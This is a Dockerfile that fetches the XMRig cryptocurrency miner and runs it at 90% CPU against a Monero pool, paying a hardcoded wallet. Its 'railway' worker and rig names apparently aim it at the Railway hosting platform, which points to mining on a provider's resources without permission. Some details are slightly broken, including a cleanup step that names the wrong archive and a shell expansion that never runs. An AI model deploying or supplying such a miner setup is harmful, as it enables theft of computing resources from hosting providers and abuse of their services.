FROM alpine:3.20

# Install wget and tar
RUN apk add --no-cache wget tar

# Download and extract XMRig (latest static Linux build)
RUN wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz \
    && tar -xzf xmrig-6.21.0-linux-static-x64.tar.gz \
    && mv xmrig-6.21.0/xmrig /usr/local/bin/xmrig \
    && rm -rf xmrig-6.21.0 xmrig.tar.gz

# Start mining on pool.hashvault.pro:443 (SSL)
CMD ["xmrig", \
     "-o", "pool.hashvault.pro:443", \
     "--tls", \
     "-u", "41npxEnqoL4SJf3FPxySonMjLo4dAXe64QtX5a2Ygd9SMRHuvVuBjGNMhD7fSq2BhqcAZiAdF1uCCasz2vnxtSyjKvNmr2x", \
     "-p", "railway-worker", \
     "--rig-id", "railway-$(shuf -i 1000-9999 -n 1)", \
     "--donate-level=1", \
     "--max-cpu-usage=90", \
     "--cpu-priority=2", \
     "--randomx-1gb-pages", \
     "--no-color", \
     "--print-time=60"]
